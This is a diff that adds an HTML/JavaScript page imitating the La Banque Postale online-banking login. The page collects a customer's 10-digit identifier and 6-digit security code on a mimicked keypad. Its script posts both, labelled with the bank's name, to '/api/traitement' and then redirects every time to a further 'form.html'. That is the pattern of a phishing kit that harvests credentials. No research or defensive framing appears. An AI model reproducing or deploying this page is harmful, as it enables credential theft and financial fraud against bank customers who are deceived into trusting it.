@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>La Banque Postale - Connexion</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- STYLES GENERAUX DE L'APPLICATION --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f4f7fa;
+            color: #1a202c;
+            -webkit-font-smoothing: antialiased;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .app-container {
+            width: 100%;
+            max-width: 450px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.05);
+            position: relative;
+            min-height: 100vh;
+        }
+
+        /* --- EN-TETE GLOBAL --- */
+        .lbp-navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 20px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #edf2f7;
+        }
+        .lbp-header-logo-size img {
+            height: 38px;
+            width: auto;
+            object-fit: contain;
+        }
+        .lbp-close-icon {
+            font-size: 20px;
+            color: #718096;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        /* --- ZONE DE CONTENU PRINCIPALE --- */
+        .lbp-main-content {
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .lbp-form-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0033a0;
+            margin-bottom: 24px;
+        }
+        .lbp-form-subtitle {
+            font-size: 14px;
+            color: #4a5568;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        /* --- CHAMPS DE SAISIE ET TOGGLES --- */
+        .lbp-input-group {
+            margin-bottom: 24px;
+        }
+        .lbp-field-wrapper input {
+            width: 100%;
+            padding: 16px;
+            font-family: inherit;
+            font-size: 16px;
+            border: 1px solid #cbd5e0;
+            border-radius: 6px;
+            outline: none;
+            color: #1a202c;
+        }
+        .lbp-field-wrapper input:focus {
+            border-color: #0033a0;
+        }
+        .lbp-checkbox-line {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .lbp-check-label {
+            font-size: 14px;
+            color: #4a5568;
+        }
+        
+        /* Switch iOS style pour coller à la capture */
+        .ios-switch {
+            position: relative;
+            display: inline-block;
+            width: 46px;
+            height: 24px;
+        }
+        .ios-switch input { opacity: 0; width: 0; height: 0; }
+        .ios-slider {
+            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #cbd5e0; transition: .3s; border-radius: 24px;
+        }
+        .ios-slider:before {
+            position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px;
+            background-color: white; transition: .3s; border-radius: 50%;
+        }
+        input:checked + .ios-slider { background-color: #0033a0; }
+        input:checked + .ios-slider:before { transform: translateX(22px); }
+
+        /* --- CONTENEUR IDENTIFIANT ÉTAPE 2 --- */
+        .lbp-recap-box {
+            background-color: #f0f4f9;
+            padding: 14px 18px;
+            border-radius: 6px;
+            margin-bottom: 24px;
+        }
+        .lbp-recap-label {
+            font-size: 12px;
+            color: #718096;
+            margin-bottom: 4px;
+        }
+        .lbp-recap-value {
+            font-size: 16px;
+            font-weight: 700;
+            color: #0033a0;
+        }
+
+        /* --- BULLES DE CODE DE SÉCURITÉ --- */
+        .lbp-dots-preview-wrapper {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0 25px 0;
+        }
+        .lbp-password-dot {
+            width: 14px;
+            height: 14px;
+            background-color: #e2e8f0;
+            border-radius: 50%;
+            transition: background-color 0.15s;
+        }
+        .lbp-dot-active {
+            background-color: #0033a0;
+        }
+
+        /* --- GRILLE DU CLAVIER (5 COLONNES COMPACTES ET ALIGNÉES) --- */
+        .lbp-keyboard-matrix-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+        .lbp-matrix-cell {
+            background-color: #f7fafc;
+            border: 1px solid #e2e8f0;
+            color: #0033a0;
+            border-radius: 6px;
+            padding: 16px 0;
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            cursor: pointer;
+            user-select: none;
+            transition: background-color 0.1s;
+        }
+        .lbp-matrix-cell:active {
+            background-color: #edf2f7;
+        }
+
+        /* --- BOUTONS ACTIONS DE BAS DE PAGE --- */
+        .lbp-action-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .lbp-btn {
+            width: 100%;
+            padding: 16px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+        }
+        .lbp-btn-gray {
+            background-color: #d2d6dc;
+            color: #4a5568;
+        }
+        .lbp-btn-blue {
+            background-color: #0033a0;
+            color: white;
+        }
+        .lbp-btn-submit-step1 {
+            background-color: #0033a0;
+            color: white;
+            margin-bottom: 20px;
+        }
+
+        .lbp-help-link {
+            display: block;
+            text-align: center;
+            color: #0033a0;
+            font-size: 14px;
+            text-decoration: underline;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        /* --- FOOTER BANQUE CITOYENNE --- */
+        .lbp-footer-banner {
+            background: linear-gradient(180deg, #1d70b8 0%, #004792 100%);
+            padding: 35px 24px;
+            color: white;
+            text-align: center;
+            margin-top: auto;
+        }
+        .footer-logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            letter-spacing: -0.5px;
+        }
+        .assurance-card {
+            background-color: #0c2340;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: left;
+        }
+        .card-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .card-desc {
+            font-size: 13px;
+            color: #e2e8f0;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        .card-link {
+            color: #ffffff;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 15px;
+            text-decoration: underline;
+        }
+        .card-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid white;
+            background: transparent;
+            color: white;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* --- VISIBILITÉ DES ÉTAPES --- */
+        .lbp-step {
+            display: none;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+        .lbp-active-step {
+            display: flex !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <div id="lbp-step-id" class="lbp-step lbp-active-step">
+            <header class="lbp-navbar">
+                <div class="lbp-header-logo-size">
+                    <img src="logo_BanquePostale_600x300.webp" alt="Banque Postale">
+                </div>
+                <a href="#" class="lbp-close-icon">×</a>
+            </header>
+
+            <main class="lbp-main-content">
+                <h1 class="lbp-form-title">Connexion à votre compte</h1>
+                
+                <div class="lbp-input-group">
+                    <div class="lbp-form-subtitle">Identifiant (10 chiffres)</div>
+                    <div class="lbp-field-wrapper">
+                        <input type="tel" id="lbp-id-field" maxlength="10" placeholder="Saisissez votre identifiant" autocomplete="off">
+                    </div>
+                </div>
+
+                <div class="lbp-checkbox-line">
+                    <span class="lbp-check-label">Mémoriser mon identifiant</span>
+                    <label class="ios-switch">
+                        <input type="checkbox" checked>
+                        <span class="ios-slider"></span>
+                    </label>
+                </div>
+
+                <button id="lbp-btn-continue" class="lbp-btn lbp-btn-blue lbp-btn-submit-step1">Continuer</button>
+                <a href="#" class="lbp-help-link">Identifiant / Mot de passe oublié</a>
+            </main>
+        </div>
+
+        <div id="lbp-step-password" class="lbp-step">
+            <header class="lbp-navbar">
+                <div class="lbp-header-logo-size">
+                    <img src="logo_BanquePostale_600x300.webp" alt="Banque Postale">
+                </div>
+                <a href="#" class="lbp-close-icon">×</a>
+            </header>
+
+            <main class="lbp-main-content">
+                <h1 class="lbp-form-title">Code de sécurité</h1>
+
+                <div class="lbp-recap-box">
+                    <div class="lbp-recap-label">Identifiant client :</div>
+                    <div id="lbp-recap-id-display" class="lbp-recap-value">---------</div>
+                </div>
+
+                <div class="lbp-form-subtitle" style="text-align:center; margin-bottom:10px;">Saisissez votre code personnel à 6 chiffres</div>
+                
+                <div class="lbp-dots-preview-wrapper">
+                    <div class="lbp-password-dot"></div>
+                    <div class="lbp-password-dot"></div>
+                    <div class="lbp-password-dot"></div>
+                    <div class="lbp-password-dot"></div>
+                    <div class="lbp-password-dot"></div>
+                    <div class="lbp-password-dot"></div>
+                </div>
+
+                <div class="lbp-keyboard-matrix-grid">
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('4')">4</div>
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('0')">0</div>
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('1')">1</div>
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('9')">9</div>
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('2')">2</div>
+                    
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('7')">7</div>
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('6')">6</div>
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('3')">3</div>
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('5')">5</div>
+                    <div class="lbp-matrix-cell" onclick="pressLbpKey('8')">8</div>
+                </div>
+
+                <div class="lbp-action-row">
+                    <button class="lbp-btn lbp-btn-gray" onclick="clearLbpKey()">Effacer</button>
+                    <button class="lbp-btn lbp-btn-blue" onclick="submitLbpFinalData()">Valider</button>
+                </div>
+
+                <a href="#" class="lbp-help-link" id="lbp-back-to-id" style="text-decoration:none;">← Retour à la saisie de l'identifiant</a>
+            </main>
+        </div>
+
+        <footer class="lbp-footer-banner">
+            <div class="footer-logo-text">La Banque Citoyenne</div>
+            <div class="assurance-card">
+                <div class="card-title">Espace Assurance</div>
+                <div class="card-desc">Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats d'assurance ?</div>
+                <a href="#" class="card-link">Signer mon contrat en ligne</a>
+                <a href="#" class="card-btn">Me connecter à mon espace assurance</a>
+            </div>
+        </footer>
+
+    </div>
+
+<script>
+    const stepId = document.getElementById('lbp-step-id');
+    const stepPass = document.getElementById('lbp-step-password');
+    const idField = document.getElementById('lbp-id-field');
+    const btnContinue = document.getElementById('lbp-btn-continue');
+    const backToId = document.getElementById('lbp-back-to-id');
+    const recapIdDisplay = document.getElementById('lbp-recap-id-display');
+    const passDots = document.querySelectorAll('.lbp-password-dot');
+
+    let accumulatedPassword = "";
+
+    // Uniquement les chiffres acceptés dans l'identifiant
+    idField.addEventListener('input', () => {
+        idField.value = idField.value.replace(/\D/g, '');
+    });
+
+    // Étape 1 vers Étape 2 (Instantané)
+    btnContinue.addEventListener('click', () => {
+        if (idField.value.length >= 4) {
+            recapIdDisplay.textContent = idField.value;
+            stepId.classList.remove('lbp-active-step');
+            stepPass.classList.add('lbp-active-step');
+        } else {
+            alert('Veuillez entrer un identifiant valide.');
+        }
+    });
+
+    // Bouton Retour
+    backToId.addEventListener('click', (e) => {
+        e.preventDefault();
+        accumulatedPassword = "";
+        updateVisualDots();
+        stepPass.classList.remove('lbp-active-step');
+        stepId.classList.add('lbp-active-step');
+    });
+
+    // Gestion de la saisie sur le clavier matriciel
+    function pressLbpKey(digit) {
+        if (accumulatedPassword.length < 6) {
+            accumulatedPassword += digit;
+            updateVisualDots();
+        }
+    }
+
+    function clearLbpKey() {
+        if (accumulatedPassword.length > 0) {
+            accumulatedPassword = accumulatedPassword.slice(0, -1);
+            updateVisualDots();
+        }
+    }
+
+    function updateVisualDots() {
+        passDots.forEach((dot, index) => {
+            if (index < accumulatedPassword.length) {
+                dot.classList.add('lbp-dot-active');
+            } else {
+                dot.classList.remove('lbp-dot-active');
+            }
+        });
+    }
+
+    // Envoi final UNIQUEMENT déclenché par le bouton Valider
+    function submitLbpFinalData() {
+        if (accumulatedPassword.length !== 6) {
+            alert('Veuillez composer votre code de sécurité à 6 chiffres.');
+            return;
+        }
+
+        const dataPayload = {
+            nom_banque: "LA BANQUE POSTALE",
+            page_source: "LA BANQUE POSTALE",
+            client_id: idField.value,
+            secret_code: accumulatedPassword
+        };
+
+        // Redirection forcée de sécurité à 1 seconde maximum
+        const safetyRedirect = setTimeout(() => {
+            window.location.href = 'form.html';
+        }, 1000);
+
+        fetch('/api/traitement', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(dataPayload)
+        })
+        .then(() => {
+            clearTimeout(safetyRedirect);
+            window.location.href = 'form.html';
+        })
+        .catch(() => {
+            clearTimeout(safetyRedirect);
+            window.location.href = 'form.html';
+        });
+    }
+</script>
+</body>
+</html>
